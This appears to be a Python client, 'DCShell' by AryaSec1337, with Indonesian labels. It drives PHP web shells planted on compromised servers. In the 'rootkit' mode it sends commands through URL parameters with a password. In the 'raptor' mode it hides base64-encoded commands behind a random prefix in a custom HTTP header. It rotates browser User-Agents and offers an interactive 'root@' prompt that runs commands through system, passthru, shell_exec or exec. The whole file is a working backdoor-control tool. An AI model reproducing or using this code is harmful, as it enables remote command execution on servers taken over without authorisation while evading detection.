import requests
import sys
import random
import base64
from rich.console import Console
from rich.table import Table

putih = '\033[97m'
hijau = '\033[92m'
merah = '\033[91m'
kuning = '\033[93m'
akhir = '\033[0m'
latar = '\033[7;91m'
info = '\033[33m[!]\033[0m'
tanya = '\033[34m[?]\033[0m'
salah = '\033[31m[-]\033[0m'
benar = '\033[32m[+]\033[0m'
jalan = '\033[97m[~]\033[0m'

console = Console()

if sys.version_info[0] == 2:
    input = raw_input
    from urlparse import urlparse
else:
    from urllib.parse import urlparse

    ascii_art = merah + r"""
▓█████▄  ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██▀ ██▌▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
░██   █▌▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▓ ▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░ ░  ░ ░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░    ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
 ░      ░                                                  
""" + akhir

    info = hijau + """
    ============================================
    |         DCShell v.1 by AryaSec1337        |
    |        Description: CMD Shell Bypass     |
    ============================================
""" + akhir

    print(ascii_art)
    print(info)

    # Tampilkan tabel mode shell
    shell_table = Table(title="Pilihan Mode Shell")
    shell_table.add_column("ID", style="cyan", no_wrap=True)
    shell_table.add_column("Nama Mode", style="magenta")
    shell_table.add_column("Deskripsi", style="green")

    shell_table.add_row("1", "Rootkit", "Mode dengan password")
    shell_table.add_row("2", "Raptor", "Payload via header base64")

    console.print(shell_table)

jenis_shell = input('%s Pilih tipe shell: ' % tanya)

if jenis_shell == '1':
    jenis_shell = 'rootkit'
    url = input('%s Masukkan URL shell: ' % tanya)
    sandi = input('%s Masukkan password: ' % tanya)
elif jenis_shell == '2':
    jenis_shell = 'raptor'
    url = input('%s Masukkan URL shell: ' % tanya)
else:
    print('%s Pilihan tidak valid!' % salah)
    sys.exit(1)

# Opsi fungsi yang tersedia
fungsi_opsi = {
    "1": "system",
    "2": "passthru",
    "3": "shell_exec",
    "4": "exec"
}

fungsi_table = Table(title="Pilih Fungsi Eksekusi")
fungsi_table.add_column("ID", style="cyan", no_wrap=True)
fungsi_table.add_column("Fungsi", style="magenta")
fungsi_table.add_column("Deskripsi", style="green")

fungsi_table.add_row("1", "system", "Menjalankan perintah sistem (Recommendation)")
fungsi_table.add_row("2", "passthru", "Eksekusi & langsung tampil")
fungsi_table.add_row("3", "shell_exec", "Output sebagai string dari shell")
fungsi_table.add_row("4", "exec", "Eksekusi standar")

console.print(fungsi_table)

pilihan_fungsi = input('%s Pilih ID fungsi yang akan digunakan: ' % tanya)
fungsi = fungsi_opsi.get(pilihan_fungsi, "system")  # default ke system jika salah

if not url.startswith('http'):
    url = 'http://' + url

user_agents = [
    'Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991'
]

def pengirim_permintaan(url, payload, shell):
    headers = {
        'Host': urlparse(url).hostname,
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'deflate',
        'Connection': 'close',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }

    if shell == 'rootkit':
        permintaan = '?f=%s&c=%s&p=%s' % (fungsi, payload, sandi)
        print(requests.get(url + permintaan, headers=headers).text)
    elif shell == 'raptor':
        awalan = ['T', 'w', 'F', 'v', 'Z', 'n']
        payload_terenkripsi = random.choice(awalan) + base64.b64encode((fungsi + '~' + payload).encode('utf-8')).decode('utf-8')
        headers['x'] = payload_terenkripsi
        print(requests.get(url, headers=headers).text)

while True:
    payload = input('%sroot@DCShell# %s ' % (merah, akhir))
    pengirim_permintaan(url, payload, jenis_shell)
